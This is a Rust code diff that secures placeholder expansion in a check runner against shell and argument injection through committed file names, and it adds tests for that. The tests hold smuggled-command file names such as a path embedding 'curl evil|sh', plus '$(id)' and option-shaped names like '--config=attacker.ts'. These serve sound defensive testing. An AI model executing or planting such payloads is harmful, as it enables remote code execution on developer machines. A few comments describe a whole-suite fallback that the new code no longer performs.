@@ -20,6 +20,7 @@ use std::path::{Path, PathBuf};
 use serde::Deserialize;
 
 use crate::config::project_settings::CheckCommand;
+use crate::execution::inputs::{InputSelector, ResolvedInputs};
 use crate::jj::GraphFileChange;
 
 /// Placeholder in a `related`-mode command, substituted with the relevant
@@ -41,20 +42,11 @@ pub enum CheckScope {
     Partial,
 }
 
-/// Whether any path intersects a check's impact set. Invalid globs are treated
-/// conservatively as a match so callers never reuse evidence on uncertainty.
-pub(crate) fn paths_match_impact(globs: &[String], paths: &[String]) -> bool {
-    let changes: Vec<GraphFileChange> = paths
-        .iter()
-        .map(|path| GraphFileChange {
-            path: path.clone(),
-            previous_path: None,
-            status: "modified".to_string(),
-            additions: 0,
-            deletions: 0,
-        })
-        .collect();
-    !matches!(matched_paths(globs, &changes), MatchOutcome::Matched(paths) if paths.is_empty())
+/// Whether any path intersects a check's impact set. Invalid globs conservatively match.
+#[cfg(test)]
+fn paths_match_impact(globs: &[String], paths: &[String]) -> bool {
+    let selector = InputSelector::from_globs(globs);
+    !selector.narrows() || paths.iter().any(|path| selector.matches(path))
 }
 
 /// The decision for a single check: whether it applies to this change set and,
@@ -75,8 +67,22 @@ pub struct CheckPlan {
     pub(crate) scope: CheckScope,
     /// Process-wide admission class used immediately before process spawn.
     pub(crate) resource_class: crate::config::project_settings::CheckResourceClass,
-    /// Whether the command executes locally and therefore needs the runner-local semaphore.
-    pub(crate) requires_runner_local_admission: bool,
+    /// Environment variables whose values can change this check's verdict.
+    /// Includes variables automatically required by the check runtime.
+    pub(crate) verdict_environment_names: Vec<String>,
+    /// Set when the check's DECLARATION cannot be expanded safely, which makes
+    /// the check unrunnable rather than merely un-narrowed.
+    ///
+    /// There is no honest command to run in that case. Deleting the placeholder
+    /// would fabricate one the project never declared — `tool --files
+    /// "{changedFiles}"` would become `tool --files ""`, which is not that tool's
+    /// whole-suite form and may select nothing — and reporting a full run over a
+    /// possibly-empty selection is exactly the vacuous green the checks contract
+    /// exists to prevent. So the runner executes nothing, caches nothing (this is
+    /// a property of the config, not of the tree), and reports the check failed
+    /// with this diagnostic.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) config_error: Option<String>,
 }
 
 /// Plan every check against a change set.
@@ -84,23 +90,66 @@ pub struct CheckPlan {
 /// Returns one [`CheckPlan`] per check, ordered by check name for determinism
 /// (the input is an unordered map). `repo_root` is the worktree root the
 /// `changed_files` paths are relative to; it anchors crate-graph resolution.
+/// `inputs` carries each check's resolved input set — the SAME object the cache
+/// key is derived from, so applicability and keying cannot disagree about what a
+/// check's inputs are.
 pub(crate) fn plan_checks(
     checks: &HashMap<String, CheckCommand>,
+    inputs: &ResolvedInputs,
     changed_files: &[GraphFileChange],
     repo_root: &Path,
 ) -> Vec<CheckPlan> {
     let mut plans: Vec<CheckPlan> = checks
         .iter()
-        .map(|(name, check)| plan_one(name, check, changed_files, repo_root))
+        .map(|(name, check)| {
+            plan_one(
+                name,
+                check,
+                inputs.for_check(name),
+                changed_files,
+                repo_root,
+            )
+        })
         .collect();
     plans.sort_by(|a, b| a.name.cmp(&b.name));
     plans
+}
+
+/// The plan for a check whose declaration puts its placeholder somewhere the
+/// expansion contract cannot cover.
+///
+/// The command is carried through VERBATIM, for display only — it is never run.
+/// The contract supports one shape, and a declaration outside it has no derivable
+/// whole-suite form: the uncertain-`{targets}` fallback works only because
+/// dropping a trailing unquoted ` {targets}` restores the declared base command,
+/// which is not true of any other position.
+fn unexpandable_plan(name: &str, check: &CheckCommand, placeholder: &str) -> CheckPlan {
+    let error = format!(
+        "check {name:?} declares {placeholder} in a position the expansion contract \
+         does not support. It must appear exactly once, as the final \
+         whitespace-delimited token of a single simple command, outside every quote, \
+         escape, comment, and shell operator. Nothing was run: there is no whole-suite \
+         form of this command to fall back to."
+    );
+    log::warn!("{error}");
+    CheckPlan {
+        name: name.to_string(),
+        applies: true,
+        command: check.command.clone(),
+        scope: CheckScope::Full,
+        resource_class: check.resource_class,
+        verdict_environment_names: crate::execution::check_identity::verdict_environment_names(
+            check,
+        ),
+        config_error: Some(error),
+    }
 }
 
 /// Plan a single check. Split out so the per-check rules read top-to-bottom.
 fn plan_one(
     name: &str,
     check: &CheckCommand,
+    selector: &InputSelector,
     changed_files: &[GraphFileChange],
     repo_root: &Path,
 ) -> CheckPlan {
@@ -110,52 +159,89 @@ fn plan_one(
         command: check.command.clone(),
         scope,
         resource_class: check.resource_class,
-        requires_runner_local_admission: true,
+        verdict_environment_names: crate::execution::check_identity::verdict_environment_names(
+            check,
+        ),
+        config_error: None,
     };
 
-    // Coarse gate: does this check apply at all? With no `impact`, any change
-    // triggers it; with `impact` globs, only an intersecting change does. An
-    // invalid glob is treated conservatively as a match (apply, run full).
-    let matched: Vec<String> = match &check.impact {
-        None => {
-            if changed_files.is_empty() {
-                return full_plan(CheckScope::Full, false);
-            }
-            all_candidate_paths(changed_files)
+    // An invalid DECLARATION is unrunnable, not merely un-narrowed: there is no
+    // honest input set to key a verdict by. Same treatment as an unexpandable
+    // placeholder — nothing runs, nothing caches, the diagnostic is the failure.
+    if let Some(error) = selector.config_error() {
+        let error = format!("check {name:?} {error}");
+        log::warn!("{error}");
+        return CheckPlan {
+            config_error: Some(error),
+            ..full_plan(CheckScope::Full, true)
+        };
+    }
+
+    // Coarse gate: does this check apply at all? A check that declares no inputs
+    // is triggered by any change; one whose inputs resolved is triggered only by
+    // a change intersecting them. A DECLARED selector that would not resolve (an
+    // invalid glob, an underivable closure) cannot prove non-application, so it
+    // applies and runs its whole-suite command.
+    let matched: Vec<String> = if selector.narrows() {
+        let matched: Vec<String> = all_candidate_paths(changed_files)
+            .into_iter()
+            .filter(|path| selector.matches(path))
+            .collect();
+        if matched.is_empty() {
+            return full_plan(CheckScope::Full, false);
         }
-        Some(globs) => match matched_paths(globs, changed_files) {
-            MatchOutcome::Matched(paths) if !paths.is_empty() => paths,
-            MatchOutcome::Matched(_) => return full_plan(CheckScope::Full, false),
-            // Glob compilation failed: we cannot prove non-application, so apply
-            // and run the full command conservatively.
-            MatchOutcome::GlobError => return full_plan(CheckScope::Full, true),
-        },
+        matched
+    } else if selector.is_declared() {
+        return full_plan(CheckScope::Full, true);
+    } else {
+        if changed_files.is_empty() {
+            return full_plan(CheckScope::Full, false);
+        }
+        all_candidate_paths(changed_files)
     };
 
     // The check applies. Selectivity is expressed by a placeholder inside the
     // command — the placeholder *is* the selector, and its resolver is implied.
     if check.command.contains(CHANGED_FILES_PLACEHOLDER) {
-        // `{changedFiles}` → the impact-matched changed files.
-        let command = substitute(&check.command, CHANGED_FILES_PLACEHOLDER, &join(&matched));
+        // `{changedFiles}` → the impact-matched changed files, expanded only where
+        // the declaration puts the placeholder somewhere expansion is inert.
+        if !placeholder_is_expandable(&check.command, CHANGED_FILES_PLACEHOLDER) {
+            return unexpandable_plan(name, check, CHANGED_FILES_PLACEHOLDER);
+        }
+        let command = substitute(
+            &check.command,
+            CHANGED_FILES_PLACEHOLDER,
+            &join_args_encoded(matched.iter().map(String::as_str), encode_path_token),
+        );
         CheckPlan {
             name: name.to_string(),
             applies: true,
             command,
             scope: CheckScope::Partial,
             resource_class: check.resource_class,
-            requires_runner_local_admission: true,
+            verdict_environment_names: crate::execution::check_identity::verdict_environment_names(
+                check,
+            ),
+            config_error: None,
         }
     } else if check.command.contains(TARGETS_PLACEHOLDER) {
+        if !placeholder_is_expandable(&check.command, TARGETS_PLACEHOLDER) {
+            return unexpandable_plan(name, check, TARGETS_PLACEHOLDER);
+        }
         // `{targets}` → crate-graph targets resolved from the matched files. On
         // uncertain resolution the placeholder degrades to an empty string, which
         // naturally runs the whole suite (a conservative full run).
         match resolve_crate_targets(&matched, repo_root) {
             Some(targets) if !targets.is_empty() => {
-                let args = targets
-                    .iter()
-                    .map(|c| format!("-p {c}"))
-                    .collect::<Vec<_>>()
-                    .join(" ");
+                // Crate names come from `cargo metadata`, so they are already
+                // bare words and never option-shaped; they need quoting only as
+                // a uniform belt-and-braces pass, not path disambiguation.
+                let args = join_args(
+                    targets
+                        .iter()
+                        .flat_map(|c| ["-p", c.as_str()])
+                        .collect::<Vec<_>>(),
+                );
                 let command = substitute(&check.command, TARGETS_PLACEHOLDER, &args);
                 CheckPlan {
                     name: name.to_string(),
@@ -163,7 +249,9 @@ fn plan_one(
                     command,
                     scope: CheckScope::Partial,
                     resource_class: check.resource_class,
-                    requires_runner_local_admission: true,
+                    verdict_environment_names:
+                        crate::execution::check_identity::verdict_environment_names(check),
+                    config_error: None,
                 }
             }
             _ => {
@@ -176,7 +264,9 @@ fn plan_one(
                     command,
                     scope: CheckScope::Full,
                     resource_class: check.resource_class,
-                    requires_runner_local_admission: true,
+                    verdict_environment_names:
+                        crate::execution::check_identity::verdict_environment_names(check),
+                    config_error: None,
                 }
             }
         }
@@ -184,14 +274,6 @@ fn plan_one(
         // No placeholder → run the command as-is (a full run).
         full_plan(CheckScope::Full, true)
     }
-}
-
-/// Outcome of matching changed files against a check's impact globs.
-enum MatchOutcome {
-    /// Globs compiled; carries the changed paths that matched (possibly empty).
-    Matched(Vec<String>),
-    /// A glob pattern failed to compile.
-    GlobError,
 }
 
 /// Every candidate path across the change set, deduped and sorted. A rename
@@ -208,41 +290,19 @@ fn all_candidate_paths(changed_files: &[GraphFileChange]) -> Vec<String> {
     set.into_iter().collect()
 }
 
-/// The candidate paths that match any of the impact globs, deduped and sorted.
-/// Reuses the same globset matcher the worktree-populate rules use rather than
-/// adding a second glob semantics. `literal_separator(false)` mirrors populate,
-/// so `**`/`*` cross path separators the same way.
-fn matched_paths(globs: &[String], changed_files: &[GraphFileChange]) -> MatchOutcome {
-    let set = match build_glob_set(globs) {
-        Ok(set) => set,
-        Err(_) => return MatchOutcome::GlobError,
-    };
-    let matched = all_candidate_paths(changed_files)
-        .into_iter()
-        .filter(|p| set.is_match(p))
-        .collect();
-    MatchOutcome::Matched(matched)
-}
-
-/// The content identity of the tree entries a check's impact globs select — its
+/// The content identity of the tree entries a check's selector selects — its
 /// "input hash". `entries` are `(path, blob_id)` pairs from the sealed tree; the
 /// matching subset is hashed (sorted for order-independence) so the value changes
-/// iff a matching file's content changes or the matched path set changes. Reuses
-/// [`build_glob_set`], so glob semantics are byte-identical to the application
-/// gate above (`literal_separator(false)`) — one glob semantics in the codebase.
-/// A glob-compile error conservatively includes every entry (over-invalidate,
-/// never a false reuse).
-pub(crate) fn check_input_hash(entries: &[(String, String)], globs: &[String]) -> String {
+/// iff a matching file's content changes or the matched path set changes. The
+/// predicate is the SAME [`InputSelector`] the application gate above consults,
+/// so there is exactly one answer in the codebase to "is this file an input of
+/// this check". An unresolvable selector conservatively includes every entry
+/// (over-invalidate, never a false reuse).
+pub(crate) fn check_input_hash(entries: &[(String, String)], selector: &InputSelector) -> String {
     use sha2::{Digest, Sha256};
-    let matcher = build_glob_set(globs).ok();
     let mut matched: Vec<&(String, String)> = entries
         .iter()
-        .filter(|(path, _)| {
-            matcher
-                .as_ref()
-                .map(|set| set.is_match(path))
-                .unwrap_or(true)
-        })
+        .filter(|(path, _)| selector.matches(path))
         .collect();
     matched.sort();
     let mut hasher = Sha256::new();
@@ -271,8 +331,151 @@ pub(crate) fn build_glob_set(patterns: &[String]) -> Result<globset::GlobSet, St
         .map_err(|e| format!("Failed to build glob set: {e}"))
 }
 
-fn join(paths: &[String]) -> String {
-    paths.join(" ")
+// ## The placeholder expansion contract
+//
+// A `{changedFiles}`/`{targets}` placeholder expands to a list of shell WORDS,
+// and the values it expands to are not the project's to choose: `{changedFiles}`
+// carries repository paths, and a path is named by whoever committed the file.
+// The assembled command runs through `bash -c` and, per
+// `Fleet::CHECK_CADENCE_SANDBOX_MODE`, unconfined — so expansion is a security
+// boundary, not a formatting detail.
+//
+// Two separate things have to hold, because quoting alone secures neither:
+//
+// 1. Position (declaration-controlled). Single-quoting produces a shell
+//    FRAGMENT, and a fragment is only inert where the shell is not already
+//    quoting. Inside double quotes `"'src/$(id).ts'"` still substitutes, because
+//    single quotes carry no meaning there. So the placeholder is expanded only
+//    where its contract holds: exactly once, whitespace-delimited, at the end of
+//    the command, outside any quoting or escape. That position comes from the
+//    project's declared config in the live main checkout, so validating it is a
+//    check on the declaration, never on attacker input.
+// 2. Value (attacker-controlled). Within a position proven unquoted, a
+//    single-quoted token is inert; and a token that would otherwise read as an
+//    OPTION rather than a path is disambiguated, since quoting cannot help there
+//    (`'-x'` and `-x` reach `argv` identically).
+//
+// A declaration that violates (1) is a configuration bug rather than an attack,
+// and is handled the way every other uncertain selector resolution is: the
+// placeholder degrades to empty and the check runs its whole-suite command.
+
+/// Whether `template` uses `placeholder` in the one position the expansion
+/// contract defines, and may therefore be expanded at all.
+///
+/// Requires: a non-empty literal head, exactly one occurrence, a whitespace
+/// boundary before it, nothing but whitespace after it, and a prefix that leaves
+/// the shell outside every quote and escape. Anything else — `tool --files
+/// "{changedFiles}"`, `tool --files={changedFiles}`, `tool {targets} --release` —
+/// fails closed.
+fn placeholder_is_expandable(template: &str, placeholder: &str) -> bool {
+    let Some(index) = template.find(placeholder) else {
+        return false;
+    };
+    let (head, tail) = (&template[..index], &template[index + placeholder.len()..]);
+
+    // Exactly one occurrence: a second one would expand the selector twice.
+    if tail.contains(placeholder) {
+        return false;
+    }
+    // Trailing, so no declared literal can be absorbed into the expansion.
+    if !tail.trim().is_empty() {
+        return false;
+    }
+    // A literal head anchors the command; a bare placeholder has no program.
+    if head.trim().is_empty() {
+        return false;
+    }
+    // A whitespace boundary, so the expansion cannot concatenate onto a literal.
+    if !head.ends_with(char::is_whitespace) {
+        return false;
+    }
+    head_is_single_simple_command(head)
+}
+
+/// Whether `head` is one simple command that the expansion will extend with
+/// ARGUMENTS — the only reading under which quoting the appended tokens means
+/// anything.
+///
+/// Quote neutrality alone does not establish this. `tool # c\n ` and `tool ; `
+/// are both quote-neutral, yet the first expands after a comment as a new
+/// command and the second makes the first expanded token a command NAME rather
+/// than an argument — handing execution to a path whoever committed it chose. So
+/// every separator, operator, grouping, redirection, comment, and substitution is
+/// rejected outside quotes, which leaves a single simple command by construction.
+/// The scan doubles as the quote/escape check: it must also END outside every
+/// quote and escape, or the appended token would land inside one.
+fn head_is_single_simple_command(head: &str) -> bool {
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut escaped = false;
+    for c in head.chars() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        match c {
+            // A backslash escapes inside double quotes and when unquoted, but is
+            // an ordinary character inside single quotes.
+            '\\' if !in_single => escaped = true,
+            '\'' if !in_double => in_single = !in_single,
+            '"' if !in_single => in_double = !in_double,
+            ';' | '&' | '|' | '\n' | '\r' | '(' | ')' | '<' | '>' | '#' | '$' | '`'
+                if !in_single && !in_double =>
+            {
+                return false
+            }
+            _ => {}
+        }
+    }
+    !in_single && !in_double && !escaped
+}
+
+/// Join expanded tokens into the command tail with `encode`. Only ever called
+/// for a position [`placeholder_is_expandable`] has proven unquoted.
+fn join_args_encoded<'a>(
+    tokens: impl IntoIterator<Item = &'a str>,
+    encode: impl Fn(&str) -> String,
+) -> String {
+    tokens.into_iter().map(encode).collect::<Vec<_>>().join(" ")
+}
+
+/// [`join_args_encoded`] for tokens that are not repository paths and so need no
+/// option disambiguation.
+fn join_args<'a>(tokens: impl IntoIterator<Item = &'a str>) -> String {
+    join_args_encoded(tokens, shell_quote_token)
+}
+
+/// A repository path as one shell word that the receiving tool reads as a path
+/// rather than as an option.
+///
+/// A committed file named `--config=attacker.ts` is a bare shell word, so no
+/// amount of quoting stops the tool from parsing it as an option — that is an
+/// `argv` problem, not a shell problem. `./` names the identical file and cannot
+/// be read as an option. Only option-shaped paths are rewritten, so ordinary
+/// paths stay byte-identical.
+fn encode_path_token(path: &str) -> String {
+    if path.starts_with('-') {
+        return shell_quote_token(&format!("./{path}"));
+    }
+    shell_quote_token(path)
+}
+
+/// A token the shell parses as one literal word with no expansion: ordinary path
+/// and identifier characters only. Deliberately excludes `~` (home expansion) and
+/// every quoting, globbing, redirection, and control character.
+fn is_bare_shell_word_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '+' | '=' | ':' | ',' | '@')
+}
+
+/// `token` as a single shell word: verbatim when it is already bare, otherwise
+/// single-quoted with embedded single quotes escaped the POSIX way (`'\''`).
+/// Inert only where the shell is not already quoting, which is why every caller
+/// goes through [`placeholder_is_expandable`] first.
+fn shell_quote_token(token: &str) -> String {
+    if !token.is_empty() && token.chars().all(is_bare_shell_word_char) {
+        return token.to_string();
+    }
+    format!("'{}'", token.replace('\'', r"'\''"))
 }
 
 fn substitute(template: &str, placeholder: &str, value: &str) -> String {
@@ -437,18 +640,31 @@ mod tests {
         CheckCommand {
             command: command.to_string(),
             impact: impact.map(|globs| globs.iter().map(|s| s.to_string()).collect()),
+            scope: None,
             policy: crate::config::project_settings::CheckPolicy::Advisory,
             when: crate::config::project_settings::CheckWhen::Write,
             resource_class: crate::config::project_settings::CheckResourceClass::Shared,
             timeout: None,
-            constraints: None,
+            executor: None,
+            verdict_environment: Vec::new(),
+            fixes: false,
         }
+    }
+
+    /// Every check's selector, resolved with no tree in hand — the glob and
+    /// no-input cases these tests exercise resolve identically to production.
+    fn inputs(checks: &HashMap<String, CheckCommand>) -> crate::execution::inputs::ResolvedInputs {
+        crate::execution::inputs::ResolvedInputs::resolve(
+            checks,
+            &HashMap::new(),
+            &crate::execution::inputs::TreeSnapshot::empty(),
+        )
     }
 
     fn plan_for(check: CheckCommand, changed: &[GraphFileChange]) -> CheckPlan {
         let mut map = HashMap::new();
         map.insert("check".to_string(), check);
-        plan_checks(&map, changed, Path::new("/repo"))
+        plan_checks(&map, &inputs(&map), changed, Path::new("/repo"))
             .into_iter()
             .next()
             .unwrap()
@@ -565,6 +781,162 @@ mod tests {
         assert_eq!(plan.command, "vitest related src/new.ts src/old.ts");
     }
 
+    // --- substituted arguments stay arguments ------------------------------
+
+    #[test]
+    fn substituted_changed_file_cannot_inject_shell() {
+        // The command is assembled for `bash -c` and runs unconfined, so a path
+        // named by whoever committed the file must survive as one literal word.
+        let c = check("vitest related {changedFiles}", Some(&["src/**"]));
+        let plan = plan_for(c, &[change("src/a;curl evil|sh.ts", "added")]);
+        assert_eq!(plan.command, "vitest related 'src/a;curl evil|sh.ts'");
+    }
+
+    #[test]
+    fn substituted_changed_file_with_quote_is_escaped() {
+        let c = check("vitest related {changedFiles}", Some(&["src/**"]));
+        let plan = plan_for(c, &[change("src/it's.ts", "added")]);
+        assert_eq!(plan.command, r"vitest related 'src/it'\''s.ts'");
+    }
+
+    #[test]
+    fn option_shaped_paths_are_disambiguated_not_just_quoted() {
+        // Quoting cannot fix this: `'-x'` and `-x` reach argv identically, so a
+        // committed file named like an option would stay an option to the tool.
+        let c = check("vitest related {changedFiles}", Some(&["**"]));
+        let plan = plan_for(c, &[change("--config=attacker.ts", "added")]);
+        assert_eq!(plan.command, "vitest related ./--config=attacker.ts");
+
+        assert_eq!(encode_path_token("-rf"), "./-rf");
+        // Disambiguation and quoting compose for a path that needs both.
+        assert_eq!(encode_path_token("--out=$(id)"), "'./--out=$(id)'");
+        // A path that merely contains a dash is untouched.
+        assert_eq!(encode_path_token("src/my-file.ts"), "src/my-file.ts");
+    }
+
+    // --- the expansion contract: only an inert position expands -------------
+
+    #[test]
+    fn quoted_placeholder_is_not_expanded() {
+        // Single quotes carry no meaning inside double quotes, so a quoted token
+        // spliced here would still be substituted by the shell. Refuse to expand
+        // and run the whole suite instead.
+        for template in [
+            "tool --files \"{changedFiles}\"",
+            "tool --files '{changedFiles}'",
+            "tool \"a b\" --files \"{changedFiles}\"",
+        ] {
+            assert!(
+                !placeholder_is_expandable(template, CHANGED_FILES_PLACEHOLDER),
+                "quoted placeholder must not expand: {template}"
+            );
+        }
+
+        // A quoted placeholder has no derivable whole-suite form, so the
+        // declaration is carried through verbatim for display and marked
+        // unrunnable rather than expanded to an empty selection.
+        let c = check("tool --files \"{changedFiles}\"", Some(&["src/**"]));
+        let plan = plan_for(c, &[change("src/$(id).ts", "added")]);
+        assert_eq!(plan.scope, CheckScope::Full);
+        assert!(
+            !plan.command.contains("$(id)"),
+            "attacker-named path must never reach a quoted context: {}",
+            plan.command
+        );
+        assert_eq!(plan.command, "tool --files \"{changedFiles}\"");
+        assert!(
+            plan.config_error.is_some(),
+            "an unexpandable declaration must be reported unrunnable, not run"
+        );
+    }
+
+    #[test]
+    fn escaped_or_concatenated_placeholder_is_not_expanded() {
+        for template in [
+            // Mid-escape: the backslash would consume the opening quote.
+            r#"tool --files \{changedFiles}"#,
+            // Concatenated onto a literal: expansion would fuse with `--files=`.
+            "tool --files={changedFiles}",
+            // Not trailing: a declared literal would be absorbed after expansion.
+            "tool {changedFiles} --reporter=json",
+            // Twice: the selector would be expanded into two places.
+            "tool {changedFiles} {changedFiles}",
+            // No literal head: there is no program to run.
+            "{changedFiles}",
+        ] {
+            assert!(
+                !placeholder_is_expandable(template, CHANGED_FILES_PLACEHOLDER),
+                "must not expand: {template}"
+            );
+        }
+    }
+
+    #[test]
+    fn declared_repository_check_shapes_remain_expandable() {
+        // The shapes this project actually declares must keep narrowing.
+        for template in [
+            "bunx vitest related {changedFiles}",
+            "bunx vitest related --reporter=default --reporter=json {changedFiles}",
+        ] {
+            assert!(
+                placeholder_is_expandable(template, CHANGED_FILES_PLACEHOLDER),
+                "declared shape must expand: {template}"
+            );
+        }
+        assert!(placeholder_is_expandable(
+            "bun run test:rust {targets}",
+            TARGETS_PLACEHOLDER
+        ));
+    }
+
+    /// The quote/escape half of the head scan: a head that ends inside a quote
+    /// or escape would swallow the appended token, whatever else it contains.
+    #[test]
+    fn head_scan_tracks_quotes_and_escapes() {
+        assert!(head_is_single_simple_command("tool --files "));
+        assert!(head_is_single_simple_command(r#"tool "a b" "#));
+        assert!(head_is_single_simple_command("tool 'a b' "));
+        // A single quote inside double quotes is literal, so this stays neutral.
+        assert!(head_is_single_simple_command("tool \"it's\" "));
+
+        assert!(!head_is_single_simple_command("tool \""));
+        assert!(!head_is_single_simple_command("tool '"));
+        assert!(!head_is_single_simple_command(r"tool \"));
+        // A double quote inside single quotes does not open a double-quote span.
+        assert!(!head_is_single_simple_command("tool 'a\"b"));
+    }
+
+    #[test]
+    fn substituted_expansion_characters_are_quoted() {
+        // Globs, home expansion, and substitution must not reach the shell even
+        // though none of them are separators.
+        assert_eq!(shell_quote_token("src/*.ts"), "'src/*.ts'");
+        assert_eq!(shell_quote_token("~/x.ts"), "'~/x.ts'");
+        assert_eq!(shell_quote_token("$(id).ts"), "'$(id).ts'");
+        assert_eq!(shell_quote_token("a b.ts"), "'a b.ts'");
+        assert_eq!(shell_quote_token(""), "''");
+    }
+
+    #[test]
+    fn ordinary_tokens_are_emitted_verbatim() {
+        // The quoting guard must not churn the command string in the ordinary
+        // case: the command is part of a check's result key, so a gratuitous
+        // quote would invalidate every cached verdict.
+        for token in [
+            "src/a.ts",
+            "packages/ui/src/Button.tsx",
+            "-p",
+            "cairn-core",
+            "src-tauri/os/cairn-core/src/lib.rs",
+        ] {
+            assert_eq!(shell_quote_token(token), token);
+        }
+        assert_eq!(
+            join_args(["-p", "cairn-core", "-p", "cairn-db"]),
+            "-p cairn-core -p cairn-db"
+        );
+    }
+
     // --- targets: uncertain resolution degrades to a full run --------------
 
     #[test]
@@ -594,9 +966,10 @@ mod tests {
             ("src-tauri/a.rs".to_string(), "blobA".to_string()),
             ("docs/x.md".to_string(), "blobY".to_string()),
         ];
+        let selector = InputSelector::from_globs(&globs);
         assert_eq!(
-            check_input_hash(&base, &globs),
-            check_input_hash(&doc_changed, &globs),
+            check_input_hash(&base, &selector),
+            check_input_hash(&doc_changed, &selector),
             "a doc-only change must not alter a src-tauri check's input hash"
         );
         // Changing a MATCHING blob changes it.
@@ -605,8 +978,34 @@ mod tests {
             ("docs/x.md".to_string(), "blobX".to_string()),
         ];
         assert_ne!(
-            check_input_hash(&base, &globs),
-            check_input_hash(&src_changed, &globs)
+            check_input_hash(&base, &selector),
+            check_input_hash(&src_changed, &selector)
+        );
+    }
+
+    /// A glob check's tree component must stay exactly what it always was: the
+    /// sorted matched `(path, blob)` pairs, NUL-separated, SHA-256. The selector
+    /// changed how the predicate is obtained, not what is hashed — this pins
+    /// that so a glob lane's keying is provably unchanged in substance.
+    #[test]
+    fn a_glob_selector_hashes_exactly_the_matched_entries() {
+        use sha2::{Digest, Sha256};
+        let globs = vec!["src/**".to_string()];
+        let entries = vec![
+            ("src/b.ts".to_string(), "blobB".to_string()),
+            ("docs/x.md".to_string(), "blobX".to_string()),
+            ("src/a.ts".to_string(), "blobA".to_string()),
+        ];
+        let mut expected = Sha256::new();
+        for (path, blob) in [("src/a.ts", "blobA"), ("src/b.ts", "blobB")] {
+            expected.update(path.as_bytes());
+            expected.update([0u8]);
+            expected.update(blob.as_bytes());
+            expected.update([0u8]);
+        }
+        assert_eq!(
+            check_input_hash(&entries, &InputSelector::from_globs(&globs)),
+            format!("{:x}", expected.finalize())
         );
     }
 
@@ -621,7 +1020,11 @@ mod tests {
             ("src/b.ts".to_string(), "2".to_string()),
             ("src/a.ts".to_string(), "1".to_string()),
         ];
-        assert_eq!(check_input_hash(&a, &globs), check_input_hash(&b, &globs));
+        let selector = InputSelector::from_globs(&globs);
+        assert_eq!(
+            check_input_hash(&a, &selector),
+            check_input_hash(&b, &selector)
+        );
     }
 
     #[test]
@@ -630,7 +1033,12 @@ mod tests {
         map.insert("zebra".to_string(), check("z", None));
         map.insert("alpha".to_string(), check("a", None));
         map.insert("mike".to_string(), check("m", None));
-        let plans = plan_checks(&map, &[change("x", "modified")], Path::new("/repo"));
+        let plans = plan_checks(
+            &map,
+            &inputs(&map),
+            &[change("x", "modified")],
+            Path::new("/repo"),
+        );
         let names: Vec<&str> = plans.iter().map(|p| p.name.as_str()).collect();
         assert_eq!(names, vec!["alpha", "mike", "zebra"]);
     }
